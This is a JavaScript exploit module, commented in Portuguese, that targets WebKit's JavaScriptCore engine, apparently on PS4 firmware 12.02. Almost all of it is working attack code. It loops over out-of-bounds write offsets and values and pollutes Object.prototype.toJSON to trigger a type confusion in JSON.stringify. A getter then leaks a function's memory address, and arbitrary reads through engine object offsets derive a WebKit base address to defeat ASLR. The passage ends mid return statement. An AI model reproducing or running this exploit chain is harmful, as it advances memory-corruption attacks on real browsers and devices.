// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R43L - Addrof com Getter)
// ATUALIZADO PARA TESTES MASSIVOS E CONFIG.MJS

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite,
    // selfTestTypeConfusionAndMemoryControl, // Removido se não usado diretamente na lógica principal
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs'; // Importar configs

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_WebKitLeak_Massive";

const VICTIM_BUFFER_SIZE = 256;
// Valores para iteração
const CRITICAL_WRITE_OFFSETS_R43L = [
    0x7C, // Original
    0x78,
    0x80,
    0x70, // Mais distante
    0x6C,
    0x5C, // Testando offsets menores, caso a estrutura seja diferente
    0x8C  // Testando offsets maiores
];

const OOB_WRITE_VALUES_R43L = [
    0xABABABAB,
    0x12345678,
    0x87654321,
    JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID, // Ex: 2, se definido e não nulo
    0x00000000,
    0xFFFFFFFF,
    0x00000001,
    0x41414141, // 'AAAA'
    0x42424242, // 'BBBB'
    // Adicionar mais IDs de Structure conhecidos ou valores que podem ser significativos
    // (JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.JSString_STRUCTURE_ID || 0xC0DEC0DE), // Exemplo
];

const FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD = Math.random();
const PROBE_CALL_LIMIT_V82 = 10;

// Offsets para WebKit Leak, usando config.mjs
const FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET);

// !! ATENÇÃO !! Este offset é relativo à instância Executable.
// O config.mjs fornecido não detalha a estrutura Executable.
// Mantendo o valor original de 0x8. Valide este offset com seu disassembly.
const ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL = 0x8;
const EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL);

let targetFunctionForLeak;
let leaked_target_function_addr = null;

function isValidPointer(ptr, context = "") {
    if (!isAdvancedInt64Object(ptr)) {
        logS3(`[isValidPointer-${context}] Input não é AdvancedInt64Object: ${String(ptr)}`, "debug_detail");
        return false;
    }
    const high = ptr.high();
    const low = ptr.low();

    if (high === 0 && low === 0) {
        logS3(`[isValidPointer-${context}] Ponteiro NULO (0x0) detectado.`, "debug_detail");
        return false;
    }
    // O valor 0x7ff8000000000000 foi o que falhou no log anterior.
    // Esta verificação específica pode precisar de ajuste se este valor for, de alguma forma, válido no PS4 12.02.
    if (high === 0x7FF80000 && low === 0x0) {
        logS3(`[isValidPointer-${context}] Ponteiro específico NaN (0x7ff8000000000000) detectado.`, "debug_detail");
        return false;
    }
    // Verificação genérica de NaN para doubles
    if ((high & 0x7FF00000) === 0x7FF00000 && (high & 0x000FFFFF) !== 0 || low !== 0) { // Mais preciso para NaN
         logS3(`[isValidPointer-${context}] Potencial NaN (não apenas 0x7ff8000000000000) detectado: ${ptr.toString(true)}`, "debug_detail");
        return false;
    }
    // Ponteiros muito baixos são geralmente inválidos em user-space (exceto offsets nulos de estruturas)
    if (high === 0 && low < 0x10000) { // Aumentado um pouco o limite inferior, mas 0x1000 ainda é uma boa heurística
        logS3(`[isValidPointer-${context}] Ponteiro baixo (provavelmente NULL page ou similar) detectado: ${ptr.toString(true)}`, "debug_detail");
        return false;
    }
    // Adicionar quaisquer outras verificações específicas do PS4 12.02 se conhecidas (ex: limites de user-space)
    // Ex: if (high > 0x8 && low > 0 ) { // Exemplo muito simples de limite superior, precisa ser preciso.
    //    logS3(`[isValidPointer-${context}] Ponteiro parece estar em região alta demais para user-space JS: ${ptr.toString(true)}`, "debug_detail");
    //    return false;
    // }
    return true;
}

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: TC + Addrof + WebKit Base Leak (R43L Massive) ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init R43L Massive...`;

    targetFunctionForLeak = function someUniqueLeakFunctionR43L_Instance_Massive() { return `target_R43L_Massive_${Date.now()}`; };
    logS3(`Função alvo para addrof (targetFunctionForLeak) recriada.`, 'info');

    logS3(`--- Fase 0 (R43L Massive): Sanity Checks do Core Exploit ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    let coreOOBReadWriteOK = false;
    try {
        coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3);
        logS3(`Sanity Check (selfTestOOBReadWrite): ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical', FNAME_CURRENT_TEST_BASE);
    } catch (e_sanity) {
        logS3(`Erro durante Sanity Checks: ${e_sanity.message}`, "critical", FNAME_CURRENT_TEST_BASE);
        coreOOBReadWriteOK = false; // Garante que está falso
    }
    await PAUSE_S3(100);

    if (!coreOOBReadWriteOK) {
        logS3(`Sanity check OOB falhou. Abortando ${FNAME_CURRENT_TEST_BASE}.`, "critical", FNAME_CURRENT_TEST_BASE);
        document.title = `${FNAME_CURRENT_TEST_BASE} OOB Sanity Fail!`;
        return {
            errorOccurred: "OOB Sanity Check Failed",
            tc_probe_details: null, stringifyResult: null,
            addrof_result: { success: false, msg: "Addrof (R43L Massive): Not run due to OOB Sanity Fail.", leaked_object_addr: null, leaked_object_addr_candidate_str: null },
            webkit_leak_result: { success: false, msg: "WebKit Leak (R43L Massive): Not run due to OOB Sanity Fail.", webkit_base_candidate: null, internal_ptr_stage1: null, internal_ptr_stage2: null },
            iteration_results_summary: [],
            total_probe_calls_last_iter: 0,
            oob_params_of_best_result: null,
            heisenbug_on_M2_in_best_result: false
        };
    }


    let iteration_results_summary = [];
    let best_result_for_runner = {
        errorOccurred: null, tc_probe_details: null, stringifyResult: null,
        addrof_result: { success: false, msg: "Addrof (R43L Massive): Not run.", leaked_object_addr: null, leaked_object_addr_candidate_str: null },
        webkit_leak_result: { success: false, msg: "WebKit Leak (R43L Massive): Not run.", webkit_base_candidate: null, internal_ptr_stage1: null, internal_ptr_stage2: null },
        oob_params_of_best_result: null, // { offset: null, value: null }
        heisenbug_on_M2_confirmed_by_tc_probe: false
    };
    let final_probe_call_count_for_report = 0;

    for (const current_critical_offset of CRITICAL_WRITE_OFFSETS_R43L) {
        for (const current_oob_value of OOB_WRITE_VALUES_R43L) {
            if (current_oob_value === null || current_oob_value === undefined) { // Pular IDs de estrutura nulos
                logS3(`Pulando valor OOB nulo/undefined para offset 0x${current_critical_offset.toString(16)}`, 'debug');
                continue;
            }

            leaked_target_function_addr = null;
            const current_oob_hex_val = toHex(current_oob_value);
            const current_offset_hex = toHex(current_critical_offset);
            const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Offset${current_offset_hex}_OOB${current_oob_hex_val}`;
            logS3(`\n===== ITERATION R43L Massive: Offset: ${current_offset_hex}, OOB Value: ${current_oob_hex_val} (Raw: ${current_oob_value}) =====`, "subtest", FNAME_CURRENT_ITERATION);
            document.title = `${FNAME_CURRENT_TEST_BASE} Testing Off:${current_offset_hex} Val:${current_oob_hex_val}`;

            let probe_call_count_iter = 0; let victim_typed_array_ref_iter = null;
            let marker_M1_ref_iter = null; let marker_M2_ref_iter = null;
            let iteration_final_tc_details_from_probe = null;
            let iteration_tc_first_detection_done = false;
            let iter_addrof_result = { success: false, msg: "Addrof (R43L Massive): Not run in this iter.", leaked_object_addr: null, leaked_object_addr_candidate_str: null };

            // Closure da sonda precisa ser definida dentro do loop para capturar victim_typed_array_ref_iter etc. da iteração atual
            function toJSON_TA_Probe_Iter_Closure_R43L_Massive() {
                probe_call_count_iter++; const call_num = probe_call_count_iter; const ctts = Object.prototype.toString.call(this);
                const is_m2c = (this === marker_M2_ref_iter && marker_M2_ref_iter !== null && ctts === '[object Object]');

                try {
                    if (call_num > PROBE_CALL_LIMIT_V82) {
                         logS3(`[PROBE_R43L_Massive] Call #${call_num}: Limite de chamadas atingido. Parando.`, "warn");
                        return { r_stop: "limit_exceeded", call_num: call_num };
                    }
                    if (call_num === 1 && this === victim_typed_array_ref_iter) {
                        marker_M2_ref_iter = { marker_id_v82_massive: "M2_Iter_R43L_Massive" };
                        marker_M1_ref_iter = { marker_id_v82_massive: "M1_Iter_R43L_Massive", payload_M2: marker_M2_ref_iter };
                        logS3(`[PROBE_R43L_Massive] Call #${call_num}: 'this' é victim_typed_array. M1/M2 criados.`, "debug");
                        return marker_M1_ref_iter;
                    } else if (is_m2c) {
                        if (!iteration_tc_first_detection_done) {
                            iteration_tc_first_detection_done = true;
                            iteration_final_tc_details_from_probe = {
                                call_number_tc_detected: call_num, probe_variant: "TA_Probe_R43L_Massive", this_type: "[object Object]",
                                this_is_M2: true, getter_defined: false, getter_fired: false,
                                leak_val_getter_int64: null, leak_val_getter_is_ptr: false, error_probe: null
                            };
                            logS3(`[PROBE_R43L_Massive] Call #${call_num} (M2C): FIRST TC. ID:${this.marker_id_v82_massive}. Definindo getter...`, "vuln");

                            try {
                                Object.defineProperty(this, 'leaky_addr_getter_R43L_Massive', {
                                    get: function() {
                                        logS3(`[PROBE_R43L_GETTER_Massive] Getter 'leaky_addr_getter_R43L_Massive' ACIONADO!`, "vuln");
                                        if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.getter_fired = true;

                                        if (!victim_typed_array_ref_iter?.buffer) {
                                            iter_addrof_result.msg = "AddrofGetter (R43L Massive): victim_typed_array_ref_iter.buffer é nulo.";
                                            if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.leak_val_getter_int64 = "addrof_victim_null";
                                            return "getter_victim_null";
                                        }
                                        if (typeof targetFunctionForLeak !== 'function') {
                                            iter_addrof_result.msg = "AddrofGetter (R43L Massive): targetFunctionForLeak não é uma função.";
                                            return "getter_target_invalid";
                                        }

                                        let float_view = new Float64Array(victim_typed_array_ref_iter.buffer);
                                        let uint32_view = new Uint32Array(victim_typed_array_ref_iter.buffer);
                                        const original_low = uint32_view[0]; const original_high = uint32_view[1];
                                        const original_float_val = float_view[0];

                                        try {
                                            float_view[0] = targetFunctionForLeak;
                                            const leaked_low = uint32_view[0];
                                            const leaked_high = uint32_view[1];
                                            logS3(`[PROBE_R43L_GETTER_DEBUG_Massive] Original no buffer: L:0x${original_low.toString(16)} H:0x${original_high.toString(16)} (Float: ${original_float_val})`, "leak_detail");
                                            logS3(`[PROBE_R43L_GETTER_DEBUG_Massive] Raw após escrita obj: L:0x${leaked_low.toString(16)} H:0x${leaked_high.toString(16)}`, "leak");
                                            
                                            // Teste adicional: a escrita realmente mudou o valor do float para o objeto?
                                            if (float_view[0] !== targetFunctionForLeak) {
                                                logS3(`[PROBE_R43L_GETTER_WARN_Massive] Escrita de targetFunctionForLeak em float_view[0] não persistiu! float_view[0] é ${typeof float_view[0]}`, "warn");
                                                iter_addrof_result.msg = "AddrofGetter (R43L Massive): Escrita do objeto no buffer não funcionou como esperado (valor não é o objeto).";
                                                // Não necessariamente retorna aqui, ainda tenta validar o ponteiro, mas é um mau sinal.
                                            }


                                            const potential_addr = new AdvancedInt64(leaked_low, leaked_high);
                                            iter_addrof_result.leaked_object_addr_candidate_str = potential_addr.toString(true);
                                            if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.leak_val_getter_int64 = iter_addrof_result.leaked_object_addr_candidate_str;

                                            if (isValidPointer(potential_addr, "_getterAddrof_Massive")) {
                                                leaked_target_function_addr = potential_addr;
                                                iter_addrof_result.leaked_object_addr = leaked_target_function_addr.toString(true); // Use .toString(true) para formato 0xHIGH_LOW
                                                iter_addrof_result.success = true;
                                                iter_addrof_result.msg = "AddrofGetter (R43L Massive): Sucesso ao obter endereço candidato da função.";
                                                if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.leak_val_getter_is_ptr = true;
                                                logS3(`[PROBE_R43L_GETTER_Massive] SUCESSO! Addr: ${leaked_target_function_addr.toString(true)}`, "vuln");
                                                return "getter_addrof_success";
                                            } else {
                                                iter_addrof_result.msg = `AddrofGetter (R43L Massive): Endereço candidato (${iter_addrof_result.leaked_object_addr_candidate_str}) não parece ponteiro válido.`;
                                                if (leaked_low === original_low && leaked_high === original_high) {
                                                     iter_addrof_result.msg += " Conteúdo do buffer não alterado pela escrita do objeto.";
                                                     logS3(`[PROBE_R43L_GETTER_Massive] Conteúdo do buffer não foi alterado.`, "warn");
                                                }
                                                return "getter_addrof_invalid_ptr";
                                            }
                                        } catch (e_addrof_getter) {
                                            iter_addrof_result.msg = `AddrofGetter (R43L Massive) EXCEPTION: ${e_addrof_getter.message}`;
                                            if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.leak_val_getter_int64 = `addrof_getter_ex:${e_addrof_getter.message}`;
                                            console.error("[PROBE_R43L_GETTER_Massive] Exceção:", e_addrof_getter);
                                            return "getter_addrof_exception";
                                        } finally {
                                            // Restaurar o valor original do buffer para minimizar efeitos colaterais
                                            uint32_view[0] = original_low;
                                            uint32_view[1] = original_high;
                                            logS3(`[PROBE_R43L_GETTER_DEBUG_Massive] Buffer restaurado para L:0x${uint32_view[0].toString(16)} H:0x${uint32_view[1].toString(16)}`, "leak_detail");
                                        }
                                    },
                                    enumerable: true, configurable: true
                                });
                                if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.getter_defined = true;
                                logS3(`[PROBE_R43L_Massive] Getter 'leaky_addr_getter_R43L_Massive' definido em M2.`, "debug");
                            } catch (e_def_getter) {
                                logS3(`[PROBE_R43L_Massive] ERRO ao definir getter em M2: ${e_def_getter.message}`, "error");
                                if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.error_probe = `DefineGetterErr: ${e_def_getter.message}`;
                            }
                        }
                        return this; // JSON.stringify irá tentar ler 'leaky_addr_getter_R43L_Massive'
                    }
                } catch (e_pm) {
                    if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.error_probe = `ProbeMainErr:${e_pm.message}`;
                    else { // Erro antes mesmo de tc_details ser inicializado
                         iteration_final_tc_details_from_probe = { error_probe: `ProbeMainErrEarly:${e_pm.message}` };
                    }
                    console.error("[PROBE_R43L_Massive] Erro principal na sonda:", e_pm);
                    logS3(`[PROBE_R43L_Massive] Call #${call_num}: Erro na sonda: ${e_pm.message}`, "error");
                    return { err_pm: call_num, msg: e_pm.message, type: ctts };
                }
                logS3(`[PROBE_R43L_Massive] Call #${call_num}: 'this' é ${ctts}. Retornando tipo.`, "debug_detail");
                return { gen_m: call_num, type: ctts };
            }


            let iter_raw_stringify_output = null; let iter_stringify_output_parsed = null;
            let iter_primary_error = null;
            let iter_webkit_leak_result = { success: false, msg: "WebKit Leak (R43L Massive): Not run in this iter.", webkit_base_candidate: null, internal_ptr_stage1: null, internal_ptr_stage2: null };
            let heisenbugConfirmedThisIter = false;

            try {
                logS3(`  --- Fase 1 (R43L Massive): Detecção de Type Confusion & Addrof via Getter (Offset: ${current_offset_hex}, Val: ${current_oob_hex_val}) ---`, "subtest", FNAME_CURRENT_ITERATION);
                await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-TCSetup` });
                oob_write_absolute(current_critical_offset, current_oob_value, 4); // Usar offset e valor da iteração
                logS3(`   OOB Write: Escrito valor ${current_oob_hex_val} (tipo: ${typeof current_oob_value}) no offset ${current_offset_hex}`, 'info');
                await PAUSE_S3(150); // Pausa para Heisenbug se manifestar

                victim_typed_array_ref_iter = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));
                // Preencher com um padrão para que a alteração seja mais óbvia
                new Float64Array(victim_typed_array_ref_iter.buffer).fill(FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD);
                logS3(`   Victim TypedArray criado e preenchido com padrão: ${FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD}`, 'debug_detail');


                const ppKey = 'toJSON'; let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
                try {
                    Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_Iter_Closure_R43L_Massive, writable: true, configurable: true, enumerable: false });
                    polluted = true;
                    logS3(`   Object.prototype.toJSON poluído com sonda. Chamando JSON.stringify...`, 'debug');
                    iter_raw_stringify_output = JSON.stringify(victim_typed_array_ref_iter);
                    try { iter_stringify_output_parsed = JSON.parse(iter_raw_stringify_output); } catch (e_p) { iter_stringify_output_parsed = { err_parse: iter_raw_stringify_output, msg: e_p.message }; }
                    logS3(`   JSON.stringify output (raw): ${iter_raw_stringify_output}`, 'debug_detail');

                    if (iteration_final_tc_details_from_probe && iteration_final_tc_details_from_probe.this_is_M2) {
                        heisenbugConfirmedThisIter = true;
                        logS3(`  TC Probe R43L Massive: TC on M2 CONFIRMED. Getter def: ${iteration_final_tc_details_from_probe.getter_defined}. Getter fired: ${iteration_final_tc_details_from_probe.getter_fired}. Addrof success: ${iter_addrof_result.success}. Addr: ${iter_addrof_result.leaked_object_addr || iter_addrof_result.leaked_object_addr_candidate_str || 'N/A'}`, iter_addrof_result.success ? "vuln" : "warn", FNAME_CURRENT_ITERATION);
                    } else {
                        logS3(`  TC Probe R43L Massive: TC on M2 NOT Confirmed. Details: ${JSON.stringify(iteration_final_tc_details_from_probe)}`, "error", FNAME_CURRENT_ITERATION);
                    }
                } catch (e_str) {
                    if (!iter_primary_error) iter_primary_error = e_str;
                    logS3(`  TC/Addrof Probe R43L Massive: JSON.stringify EXCEPTION: ${e_str.message}`, "error", FNAME_CURRENT_ITERATION);
                    console.error("Erro no stringify R43L Massive:", e_str);
                     if (!iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe = {}; // Garantir que o objeto existe
                     iteration_final_tc_details_from_probe.error_probe = (iteration_final_tc_details_from_probe.error_probe || "") + ` StringifyErr: ${e_str.message}`;

                } finally {
                    if (polluted) {
                        if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey];
                        logS3(`   Object.prototype.toJSON restaurado.`, 'debug');
                    }
                }
                logS3(`  --- Fase 1 (R43L Massive) Concluída. TC M2: ${heisenbugConfirmedThisIter}. Addrof Sucesso: ${iter_addrof_result.success} ---`, heisenbugConfirmedThisIter && iter_addrof_result.success ? "good" : "subtest_warn", FNAME_CURRENT_ITERATION);
                await PAUSE_S3(100);

                // Fase 2: WebKit Leak
                logS3(`  --- Fase 2 (R43L Massive): Teste de WebKit Base Leak ---`, "subtest", FNAME_CURRENT_ITERATION);
                if (heisenbugConfirmedThisIter && iter_addrof_result.success && leaked_target_function_addr) {
                     if (!isOOBReady(`${FNAME_CURRENT_ITERATION}-PreArbReadCheck`)) {
                        logS3(`   WebKitLeak: Ambiente OOB não está pronto. Tentando re-inicializar...`, "warn", FNAME_CURRENT_ITERATION);
                        await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-PreArbReadCheckReinit` });
                    }

                    if (!isOOBReady()) {
                        iter_webkit_leak_result.msg = "WebKit Leak (R43L Massive): Falha ao preparar/re-preparar ambiente OOB para arb_read.";
                        logS3(`   ${iter_webkit_leak_result.msg}`, "error", FNAME_CURRENT_ITERATION);
                    } else {
                        try {
                            logS3(`  WebKitLeak: Endereço da função alvo (leaked_target_function_addr): ${leaked_target_function_addr.toString(true)}`, 'info', FNAME_CURRENT_ITERATION);

                            // Usando offsets do config.mjs via constantes definidas no topo do script
                            const ptr_to_executable_instance = await arb_read(leaked_target_function_addr.add(FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE), 8);
                            iter_webkit_leak_result.internal_ptr_stage1 = isAdvancedInt64Object(ptr_to_executable_instance) ? ptr_to_executable_instance.toString(true) : String(ptr_to_executable_instance);
                            if (!isValidPointer(ptr_to_executable_instance, "_execInst_Massive")) {
                                throw new Error(`Ponteiro para ExecutableInstance inválido ou nulo: ${iter_webkit_leak_result.internal_ptr_stage1}`);
                            }
                            logS3(`  WebKitLeak: Ponteiro para ExecutableInstance lido de [func_addr + ${FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE.toString(true)}]: ${ptr_to_executable_instance.toString(true)}`, 'leak', FNAME_CURRENT_ITERATION);

                            const ptr_to_jit_or_vm = await arb_read(ptr_to_executable_instance.add(EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM), 8);
                            iter_webkit_leak_result.internal_ptr_stage2 = isAdvancedInt64Object(ptr_to_jit_or_vm) ? ptr_to_jit_or_vm.toString(true) : String(ptr_to_jit_or_vm);
                            if (!isValidPointer(ptr_to_jit_or_vm, "_jitVm_Massive")) {
                                throw new Error(`Ponteiro para JIT/VM inválido ou nulo: ${iter_webkit_leak_result.internal_ptr_stage2}`);
                            }
                            logS3(`  WebKitLeak: Ponteiro para JIT/VM lido de [exec_addr + ${EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM.toString(true)}]: ${ptr_to_jit_or_vm.toString(true)}`, 'leak', FNAME_CURRENT_ITERATION);

                            const page_mask_4kb = new AdvancedInt64(0x0, ~0xFFF);
                            const webkit_base_candidate = ptr_to_jit_or_vm.and(page_mask_4kb);

                            iter_webkit_leak_result.webkit_base_candidate = webkit_base_candidate.toString(true);
                            iter_webkit_leak_result.success = true;
                            iter_webkit_leak_result.msg = `WebKitLeak (R43L Massive): Candidato a base do WebKit: ${webkit_base_candidate.toString(true)}`;
                            logS3(`  WebKitLeak: SUCESSO! ${iter_webkit_leak_result.msg}`, "vuln", FNAME_CURRENT_ITERATION);

                        } catch (e_webkit_leak) {
                            iter_webkit_leak_result.msg = `WebKitLeak (R43L Massive) EXCEPTION: ${e_webkit_leak.message || String(e_webkit_leak)}`;
                            logS3(`  WebKitLeak: ERRO - ${iter_webkit_leak_result.msg}`, "error", FNAME_CURRENT_ITERATION);
                            if (!iter_primary_error) iter_primary_error = e_webkit_leak;
                            console.error("Erro no WebKitLeak R43L Massive:", e_webkit_leak);
                        }
                    }
                } else {
                    let skipMsg = "WebKitLeak (R43L Massive): Pulado. ";
                    if (!heisenbugConfirmedThisIter) skipMsg += "TC Fase 1 falhou. ";
                    if (!iter_addrof_result.success) skipMsg += "Addrof falhou. ";
                    if (!leaked_target_function_addr) skipMsg += "Endereço da função alvo não obtido. ";
                    iter_webkit_leak_result.msg = skipMsg;
                    logS3(iter_webkit_leak_result.msg, "warn", FNAME_CURRENT_ITERATION);
                }
                logS3(`  --- Fase 2 (R43L Massive) Concluída. WebKitLeak Sucesso: ${iter_webkit_leak_result.success} ---`, iter_webkit_leak_result.success ? "good" : "subtest_warn", FNAME_CURRENT_ITERATION);

            } catch (e_outer_iter) {
                if (!iter_primary_error) iter_primary_error = e_outer_iter;
                logS3(`  CRITICAL ERROR ITERATION R43L Massive (Off:${current_offset_hex},Val:${current_oob_hex_val}): ${e_outer_iter.message || String(e_outer_iter)}`, "critical", FNAME_CURRENT_ITERATION);
                console.error(`Outer error in iteration R43L Massive (Off:${current_offset_hex},Val:${current_oob_hex_val}):`, e_outer_iter);
                 if (iteration_final_tc_details_from_probe) {
                    iteration_final_tc_details_from_probe.error_probe = (iteration_final_tc_details_from_probe.error_probe || "") + ` OuterIterErr: ${e_outer_iter.message}`;
                } else {
                    iteration_final_tc_details_from_probe = { error_probe: `OuterIterErrEarly: ${e_outer_iter.message}` };
                }
            } finally {
                await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_ITERATION}-FinalClearR43LMassive` });
            }

            final_probe_call_count_for_report = probe_call_count_iter; // Salva a contagem da última iteração

            let current_iter_summary = {
                oob_offset: current_offset_hex,
                oob_value: current_oob_hex_val,
                raw_oob_value: current_oob_value,
                error: iter_primary_error ? (iter_primary_error.message || String(iter_primary_error)) : null,
                tc_probe_details: iteration_final_tc_details_from_probe ? JSON.parse(JSON.stringify(iteration_final_tc_details_from_probe)) : null,
                stringifyResult: iter_stringify_output_parsed, // Pode ser grande, mas útil para depurar
                addrof_result_this_iter: iter_addrof_result,
                webkit_leak_result_this_iter: iter_webkit_leak_result,
                heisenbug_on_M2_confirmed_by_tc_probe: heisenbugConfirmedThisIter
            };
            iteration_results_summary.push(current_iter_summary);

            // Lógica para atualizar best_result_for_runner
            if (current_iter_summary.error === null) { // Apenas considerar iterações sem erro primário
                let current_is_better_than_best = false;
                if (best_result_for_runner.errorOccurred !== null || best_result_for_runner.oob_params_of_best_result === null) {
                    current_is_better_than_best = true; // O primeiro sucesso sem erro é o melhor
                } else {
                    const current_score = (current_iter_summary.webkit_leak_result_this_iter.success ? 4 : 0) +
                                          (current_iter_summary.addrof_result_this_iter.success ? 2 : 0) +
                                          (current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe ? 1 : 0);
                    const best_score = (best_result_for_runner.webkit_leak_result.success ? 4 : 0) +
                                       (best_result_for_runner.addrof_result.success ? 2 : 0) +
                                       (best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe ? 1 : 0);
                    if (current_score > best_score) {
                        current_is_better_than_best = true;
                    }
                }

                if (current_is_better_than_best) {
                    best_result_for_runner = {
                        errorOccurred: null, // Já sabemos que é null
                        tc_probe_details: current_iter_summary.tc_probe_details,
                        stringifyResult: current_iter_summary.stringifyResult,
                        addrof_result: current_iter_summary.addrof_result_this_iter,
                        webkit_leak_result: current_iter_summary.webkit_leak_result_this_iter,
                        oob_params_of_best_result: { offset: current_offset_hex, value: current_oob_hex_val, raw_value: current_oob_value, raw_offset: current_critical_offset },
                        heisenbug_on_M2_confirmed_by_tc_probe: current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe
                    };
                    logS3(`*** NOVO MELHOR RESULTADO ENCONTRADO com Offset: ${current_offset_hex}, Valor: ${current_oob_hex_val} ***`, "success_major", FNAME_CURRENT_ITERATION);
                    logS3(`    Detalhes do Melhor: Addrof=${best_result_for_runner.addrof_result.success}, WebKitLeak=${best_result_for_runner.webkit_leak_result.success}, TC=${best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe}`, "success_major", FNAME_CURRENT_ITERATION);
                }
            } else if (best_result_for_runner.oob_params_of_best_result === null &&
                       current_critical_offset === CRITICAL_WRITE_OFFSETS_R43L[CRITICAL_WRITE_OFFSETS_R43L.length - 1] &&
                       current_oob_value === OOB_WRITE_VALUES_R43L[OOB_WRITE_VALUES_R43L.length - 1]) {
                // Se todas as iterações falharam com erro, o último erro é registrado como o "melhor" (pior)
                best_result_for_runner = {
                    errorOccurred: current_iter_summary.error,
                    tc_probe_details: current_iter_summary.tc_probe_details,
                    stringifyResult: current_iter_summary.stringifyResult,
                    addrof_result: current_iter_summary.addrof_result_this_iter,
                    webkit_leak_result: current_iter_summary.webkit_leak_result_this_iter,
                    oob_params_of_best_result: { offset: current_offset_hex, value: current_oob_hex_val, raw_value: current_oob_value, raw_offset: current_critical_offset },
                    heisenbug_on_M2_confirmed_by_tc_probe: current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe
                };
            }


            if (iter_webkit_leak_result.success) document.title = `${FNAME_CURRENT_TEST_BASE} WebKitLeak OK! (O:${current_offset_hex} V:${current_oob_hex_val})`;
            else if (iter_addrof_result.success) document.title = `${FNAME_CURRENT_TEST_BASE} Addrof OK (O:${current_offset_hex} V:${current_oob_hex_val})`;
            else if (heisenbugConfirmedThisIter) document.title = `${FNAME_CURRENT_TEST_BASE} TC OK (O:${current_offset_hex} V:${current_oob_hex_val})`;
            else document.title = `${FNAME_CURRENT_TEST_BASE} Iter Done (O:${current_offset_hex} V:${current_oob_hex_val})`;

            await PAUSE_S3(100); // Pequena pausa entre sub-iterações
        } // Fim do loop OOB_WRITE_VALUES_R43L
        await PAUSE_S3(250); // Pausa maior entre mudanças de offset
    } // Fim do loop CRITICAL_WRITE_OFFSETS_R43L

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    if (best_result_for_runner.oob_params_of_best_result) {
        logS3(`Melhor resultado obtido com Offset: ${best_result_for_runner.oob_params_of_best_result.offset}, Valor: ${best_result_for_runner.oob_params_of_best_result.value}`, "info_emphasis", FNAME_CURRENT_TEST_BASE);
    } else {
        logS3(`Nenhum resultado de sucesso foi encontrado em todas as iterações.`, "critical", FNAME_CURRENT_TEST_BASE);
    }
    logS3(`Best/Final result (R43L Massive): ${JSON.stringify(best_result_for_runner, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);

    if (best_result_for_runner.webkit_leak_result.success) document.title = `${FNAME_CURRENT_TEST_BASE} Final: WebKitLeak OK!`;
    else if (best_result_for_runner.addrof_result.success) document.title = `${FNAME_CURRENT_TEST_BASE} Final: Addrof OK`;
    else if (best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe) document.title = `${FNAME_CURRENT_TEST_BASE} Final: TC OK`;
    else if (best_result_for_runner.errorOccurred) document.title = `${FNAME_CURRENT_TEST_BASE} Final: Error - ${best_result_for_runner.errorOccurred}`;
    else document.title = `${FNAME_CURRENT_TEST_BASE} Final: No Success`;


    return {
        errorOccurred: best_result_for_runner.errorOccurred,
        tc_probe_details: best_result_for_runner.tc_probe_details,
